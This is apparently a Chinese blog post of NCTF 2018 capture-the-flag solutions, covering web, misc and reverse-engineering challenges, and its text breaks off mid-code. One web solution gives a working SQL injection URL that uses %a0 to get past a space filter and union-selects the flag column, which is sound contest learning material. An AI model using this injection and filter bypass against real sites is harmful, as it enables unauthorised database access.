<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2018NCTF解题思路 - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到题"><span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#滴！晨跑打卡"><span class="toc-text">滴！晨跑打卡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CalcNow"><span class="toc-text">CalcNow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后门后门后门"><span class="toc-text">后门后门后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Our-16bit-wars"><span class="toc-text">Our 16bit wars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本操作-Reverse-Version"><span class="toc-text">基本操作 ~Reverse Version.~</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sendyouflag"><span class="toc-text">sendyouflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sendyousomething"><span class="toc-text">sendyousomething</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMALL-bug-I"><span class="toc-text">SMALL bug I</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2018NCTF解题思路
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2018-11-26 23:46:28</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>做的不是太好<br><a id="more"></a></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>打开之后发现是一个百度的页面，查看源代码也发现不了什么，又打开一次发现url出现了快速的转变，于是抓包拦截</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">header头：</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: ctfgame.acdxvfsvd.net:20002</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: nctf2018=where+is+flag%3F; IS_STATIC=1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应头：</span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Date: Mon, 26 Nov 2018 14:28:02 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">nctf2018: flag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125;</span><br><span class="line">location: ./secret.php</span><br><span class="line">Content-Length: 22</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure>
<p>flag：flag{w3lc0m3_t0_nctf2018hhhhhhhhhhhh}</p>
<h3 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h3><p>打开之后发现页面有一个输入框，于是测试，输入查询序号可以单独列出来，经过测试发现输入单引号会报错，所以可以判断存在SQL注入，又经过一番测试之后，发现空格被过滤了，我们可以用%a0来绕过，可以利用union注入将flag输出在页面上，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据库：information_schema,cgctf,flaaaaaaag,mysql,performance_schema</span><br><span class="line"></span><br><span class="line">flaaaaaaag中的表：f144444444g</span><br><span class="line">f144444444g中的列：th1s_1s_flag</span><br><span class="line"></span><br><span class="line">输出flapayload：</span><br><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a01,(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),3%a0and%a0%271%27=%271</span><br></pre></td></tr></table></figure>
<p>flag：nctf{this_1s_paocao_sqllllll}</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CalcNow"><a href="#CalcNow" class="headerlink" title="CalcNow"></a>CalcNow</h3><p>题目给了一个“nc ctfgame.acdxvfsvd.net 30003”，nc一波看看，发现是给你一个算式，让你算出答案然后输入进去，但是输入的时间有限制，需要写脚本去跑，经过测试，发现运算符号有“sub、add、mul、xor”，这是汇编语言中的指令，分别对应于减法、加法、乘法、亦或，脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;ctfgame.acdxvfsvd.net&quot;,30003)</span><br><span class="line">r.recv()</span><br><span class="line">Token = &quot;Wl9anMOc6jNZNZo0H53t448RpcSkRPuU&quot;</span><br><span class="line">r.sendline(Token)</span><br><span class="line">r.recv()</span><br><span class="line">str1 = r.recv()</span><br><span class="line">str2 = str1.split(&quot; &quot;)</span><br><span class="line">a = eval(str2[0])</span><br><span class="line">op = str2[1]</span><br><span class="line">b = eval(str2[2])</span><br><span class="line"></span><br><span class="line">if op==&quot;xor&quot;:</span><br><span class="line">	res = a^b</span><br><span class="line">elif op==&quot;add&quot;:</span><br><span class="line">	res = a+b</span><br><span class="line">elif op==&quot;mul&quot;:</span><br><span class="line">	res = a*b</span><br><span class="line">elif op==&quot;sub&quot;:</span><br><span class="line">	res = a-b</span><br><span class="line">r.sendline(str(res))</span><br><span class="line">print r.recvall()</span><br></pre></td></tr></table></figure>
<p>out：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wxm@wxm-PC:~/Desktop$ python test.py </span><br><span class="line">[+] Opening connection to ctfgame.acdxvfsvd.net on port 30003: Done</span><br><span class="line">[+] Receiving all data: Done (129B)</span><br><span class="line">[*] Closed connection to ctfgame.acdxvfsvd.net port 30003</span><br><span class="line">Give me the result in 2 seconds: SUCCESS</span><br><span class="line">Here is the flag</span><br><span class="line">NCTF&#123;afbc4b573ca4089d52cffd3b66c83c57499190da14665fed9cfa910496db34aa&#125;</span><br><span class="line"></span><br><span class="line">wxm@wxm-PC:~/Desktop$</span><br></pre></td></tr></table></figure>
<p>flag：NCTF{afbc4b573ca4089d52cffd3b66c83c57499190da14665fed9cfa910496db34aa}</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="后门后门后门"><a href="#后门后门后门" class="headerlink" title="后门后门后门"></a>后门后门后门</h3><p>64位可执行程序，没有加壳，运行发现陷入无线循环让你计算答案，载入IDA64中查看main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// local variable allocation has failed, the output may be wrong!</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+24h] [rbp-Ch]</span><br><span class="line">  unsigned int v5; // [rsp+28h] [rbp-8h]</span><br><span class="line">  unsigned int v6; // [rsp+2Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  _main(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  welcome();</span><br><span class="line">  while ( count != -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (unsigned __int8)rand();</span><br><span class="line">    v5 = (unsigned __int8)rand();</span><br><span class="line">    printf(&quot;%d + %d = &quot;, v6, v5);</span><br><span class="line">    v4 = ret2num();</span><br><span class="line">    if ( v4 == 23333 )</span><br><span class="line">    &#123;</span><br><span class="line">      hereisyourflag();</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v6 + v5 == v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you win,but it&apos;s missing something&quot;);</span><br><span class="line">      ++count;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;what?????&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;hao huo zhi,your math is feichang good!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以直观的查看，我们陷入循环是在welcome函数中，接着往下分析，在while循环中，会先让用户输入一个数，如果这个数等于23333的话，会进入hereisyourflag，，查看这个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">int hereisyourflag(void)</span><br><span class="line">&#123;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  v2 = 125;</span><br><span class="line">  v3 = 100;</span><br><span class="line">  v4 = 108;</span><br><span class="line">  v5 = 114;</span><br><span class="line">  v6 = 111;</span><br><span class="line">  v7 = 119;</span><br><span class="line">  v8 = 95;</span><br><span class="line">  v9 = 115;</span><br><span class="line">  v10 = 39;</span><br><span class="line">  v11 = 121;</span><br><span class="line">  v12 = 114;</span><br><span class="line">  v13 = 97;</span><br><span class="line">  v14 = 110;</span><br><span class="line">  v15 = 105;</span><br><span class="line">  v16 = 98;</span><br><span class="line">  v17 = 95;</span><br><span class="line">  v18 = 111;</span><br><span class="line">  v19 = 116;</span><br><span class="line">  v20 = 95;</span><br><span class="line">  v21 = 101;</span><br><span class="line">  v22 = 109;</span><br><span class="line">  v23 = 111;</span><br><span class="line">  v24 = 99;</span><br><span class="line">  v25 = 108;</span><br><span class="line">  v26 = 101;</span><br><span class="line">  v27 = 87;</span><br><span class="line">  v28 = 123;</span><br><span class="line">  v29 = 102;</span><br><span class="line">  v30 = 116;</span><br><span class="line">  v31 = 99;</span><br><span class="line">  v32 = 110;</span><br><span class="line">  for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;v1 + i) ^= *(&amp;v1 + 31 - i);</span><br><span class="line">    *(&amp;v1 + 31 - i) ^= *(&amp;v1 + i);</span><br><span class="line">    *(&amp;v1 + i) ^= *(&amp;v1 + 31 - i);</span><br><span class="line">  &#125;</span><br><span class="line">  return printf(&quot;here is your real flag:%s\n&quot;, &amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过这个函数中的for循环后，flag会计算出来，庆幸的是我们可以还原这个函数，而不用让程序走到这个函数，脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">list1 = [0,125,100,108,114,111,119,95, 115,39,121,114,97,110,105,98,95,111,116,95,101,109,111,99, 108, 101,87,123,102,116,99,110]</span><br><span class="line">for i in range(16):</span><br><span class="line">    list1[i]^=list1[31-i]</span><br><span class="line">    list1[31-i]^=list1[i]</span><br><span class="line">    list1[i]^=list1[31-i]</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for x in range(31):</span><br><span class="line">    flag+=chr(list1[x])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p>flag：nctf{Welcome_to_binary’s_world}</p>
<h3 id="Our-16bit-wars"><a href="#Our-16bit-wars" class="headerlink" title="Our 16bit wars"></a>Our 16bit wars</h3><p>题目说该程序是16位程序，之前我也没见过，现百度现做，IDA载入发现也没几个函数，一个一个来看，start函数调用sub_100AC函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">seg001:000C sub_100AC       proc near               ; CODE XREF: start+5↑p</span><br><span class="line">seg001:000C                 mov     di, 3</span><br><span class="line">seg001:000F                 call    sub_10115</span><br><span class="line">seg001:0012                 mov     di, 24h ; &apos;$&apos;</span><br><span class="line">seg001:0015                 call    sub_10123</span><br><span class="line">seg001:0018                 mov     bx, 24h ; &apos;$&apos;</span><br><span class="line">seg001:001B                 add     bx, 1</span><br><span class="line">seg001:001E                 cmp     byte ptr [bx], 23h</span><br><span class="line">seg001:0021                 jnz     short loc_100DD</span><br><span class="line">seg001:0023                 mov     di, 26h ; &apos;&amp;&apos;</span><br><span class="line">seg001:0026                 call    sub_100F9</span><br><span class="line">seg001:0029                 mov     si, 76h ; &apos;v&apos;</span><br><span class="line">seg001:002C                 mov     dx, 23h ; &apos;#&apos;</span><br><span class="line">seg001:002F                 call    sub_100E4</span><br><span class="line">seg001:0032                 test    ax, ax</span><br><span class="line">seg001:0034                 jnz     short loc_100DD</span><br><span class="line">seg001:0036                 mov     di, 0Fh</span><br><span class="line">seg001:0039                 call    sub_10115</span><br><span class="line">seg001:003C                 retn</span><br><span class="line">seg001:003D ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:003D</span><br><span class="line">seg001:003D loc_100DD:                              ; CODE XREF: sub_100AC+15↑j</span><br><span class="line">seg001:003D                                         ; sub_100AC+28↑j</span><br><span class="line">seg001:003D                 mov     di, 18h</span><br><span class="line">seg001:0040                 call    sub_10115</span><br><span class="line">seg001:0043                 retn</span><br><span class="line">seg001:0043 sub_100AC       endp</span><br></pre></td></tr></table></figure>
<p>我认为其实这个函数相当于main函数吧，这个函数现调用sub_10115这个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">seg001:0075 sub_10115       proc near               ; CODE XREF: sub_100AC+3↑p</span><br><span class="line">seg001:0075                                         ; sub_100AC+2D↑p ...</span><br><span class="line">seg001:0075                 mov     dx, di</span><br><span class="line">seg001:0077                 mov     ah, 9</span><br><span class="line">seg001:0079                 int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg001:0079                                         ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg001:007B                 mov     dx, 0</span><br><span class="line">seg001:007E                 mov     ah, 9</span><br><span class="line">seg001:0080                 int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg001:0080                                         ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg001:0082                 retn</span><br><span class="line">seg001:0082 sub_10115       endp</span><br></pre></td></tr></table></figure>
<p></p><p>这个函数是输出函数，输出指定的字符串，再输出一个“\n”，这里说一下“int 21h”，“int 21h”是系统调用，与”mov ah，xx;“配合使用，这里讲ah设置位9的意思是输出字符串，其他的请看：<a href="https://blog.csdn.net/trochiluses/article/details/20008631，这个函数输出input" target="_blank" rel="noopener">https://blog.csdn.net/trochiluses/article/details/20008631，这个函数输出input</a> flag:</p><p></p>
<p></p><p>接着执行sub_10123函数:</p><p></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">seg001:0083 sub_10123       proc near               ; CODE XREF: sub_100AC+9↑p</span><br><span class="line">seg001:0083                 mov     dx, di</span><br><span class="line">seg001:0085                 mov     ah, 0Ah</span><br><span class="line">seg001:0087                 int     21h             ; DOS - BUFFERED KEYBOARD INPUT</span><br><span class="line">seg001:0087                                         ; DS:DX -&gt; buffer</span><br><span class="line">seg001:0089                 mov     bx, di</span><br><span class="line">seg001:008B                 add     bx, 1</span><br><span class="line">seg001:008E                 xor     cx, cx</span><br><span class="line">seg001:0090                 mov     cl, [bx]</span><br><span class="line">seg001:0092                 add     bx, cx</span><br><span class="line">seg001:0094                 add     bx, 1</span><br><span class="line">seg001:0097                 mov     byte ptr [bx], 24h ; &apos;$&apos;</span><br><span class="line">seg001:009A                 mov     dx, 0</span><br><span class="line">seg001:009D                 mov     ah, 9</span><br><span class="line">seg001:009F                 int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg001:009F                                         ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg001:00A1                 retn</span><br><span class="line">seg001:00A1 sub_10123       endp</span><br></pre></td></tr></table></figure>
<p>这个函数是输入字符串，也就是接受flag，接着判断字符串的长度，flag的长度必须为35，若不是则输出”error“、退出，接着往下执行程序会进入sub_100F9</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">seg001:0059 sub_100F9       proc near               ; CODE XREF: sub_100AC+1A↑p</span><br><span class="line">seg001:0059                 mov     bx, di</span><br><span class="line">seg001:005B                 mov     si, 0</span><br><span class="line">seg001:005E</span><br><span class="line">seg001:005E loc_100FE:                              ; CODE XREF: sub_100F9+19↓j</span><br><span class="line">seg001:005E                 mov     al, [bx+si]</span><br><span class="line">seg001:0060                 mov     dl, al</span><br><span class="line">seg001:0062                 mov     cl, 3</span><br><span class="line">seg001:0064                 shr     al, cl</span><br><span class="line">seg001:0066                 mov     cl, 5</span><br><span class="line">seg001:0068                 shl     dl, cl</span><br><span class="line">seg001:006A                 xor     al, dl</span><br><span class="line">seg001:006C                 mov     [bx+si], al</span><br><span class="line">seg001:006E                 inc     si</span><br><span class="line">seg001:006F                 cmp     si, 23h ; &apos;#&apos;</span><br><span class="line">seg001:0072                 jnz     short loc_100FE</span><br><span class="line">seg001:0074                 retn</span><br><span class="line">seg001:0074 sub_100F9       endp</span><br></pre></td></tr></table></figure>
<p>这个函数是对输入的字符串处理，处理规则是”(flag[i]&gt;&gt;3)^(flag[i]&lt;&lt;\5)”，然后执行sub_100E4函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">seg001:0046 loc_100E6:                              ; CODE XREF: sub_100E4+B↓j</span><br><span class="line">seg001:0046                 mov     al, [bx+si]</span><br><span class="line">seg001:0048                 cmp     al, [bx+di]</span><br><span class="line">seg001:004A                 jnz     short loc_100F5</span><br><span class="line">seg001:004C                 inc     bx</span><br><span class="line">seg001:004D                 cmp     bx, dx</span><br><span class="line">seg001:004F                 jnz     short loc_100E6</span><br><span class="line">seg001:0051                 mov     ax, 0</span><br><span class="line">seg001:0054                 retn</span><br><span class="line">seg001:0055 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:0055</span><br><span class="line">seg001:0055 loc_100F5:                              ; CODE XREF: sub_100E4+6↑j</span><br><span class="line">seg001:0055                 mov     ax, 1</span><br><span class="line">seg001:0058                 retn</span><br><span class="line">seg001:0058 sub_100E4       endp</span><br></pre></td></tr></table></figure>
<p>这个函数是讲处理过的flag与程序中的数据进行比较，若匹配，则是正确的flag，若不正确，则错误<br></p>
<p>根据目前我们得到的信息，我们可以通过程序给定的对比的字符串反推出flag，解题脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">current = [0xC9,0x68,0x8A,0xC8,0x6F,0x7,0x6,0xF,0x7,0xC6,0xEB,0x86,0x6E,0x6E,66,0xAD,0x4C,0x8D,0xAC,0xEB,0x26,0x6E,0xEB,0xCC,0xAE,0xCD,0x8C,0x86,0xAD,0x66,0xCD,0x8E,0x86,0x8D,0xAF]</span><br><span class="line">num = 0</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for y in range(len(current)):</span><br><span class="line">	for x in range(32,128):</span><br><span class="line">		if ((x&gt;&gt;3)^(x&lt;&lt;5))&amp;0xff==current[y]:</span><br><span class="line">			flag+=chr(x)</span><br><span class="line">			break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p>flag：NCTF{80x86_4ssmble_1s_fund4m3nt4l}</p>
<h3 id="基本操作-Reverse-Version"><a href="#基本操作-Reverse-Version" class="headerlink" title="基本操作 ~Reverse Version.~"></a>基本操作 ~Reverse Version.~</h3><p>在终端运行程序是让输入一个flag，然后验证，用IDA载入，查看伪代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  puts(&quot;Input flag:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%64s&quot;, byte_601100);</span><br><span class="line">  dword_601064 = 0;</span><br><span class="line">  sub_400666(0);</span><br><span class="line">  if ( !strcmp(&amp;s1, &quot;bcec8d7dcda25d91ed3e0b720cbb6cf202b09fedbc3e017774273ef5d5581794&quot;) )// 先序排列</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;s1, 0, 0x80uLL);</span><br><span class="line">    dword_601064 = 0;</span><br><span class="line">    sub_4006BE(0, 0LL);</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;7d8dcdcaed592e1dcb07e02c36bcb2f0bf9e0bdcb0e13777237e25fd48515974&quot;) )// 中序排列</span><br><span class="line">      printf(&quot;TQL! TQL! flag: nctf&#123;%s&#125;\n&quot;, byte_601100);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;Emmmm.....&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    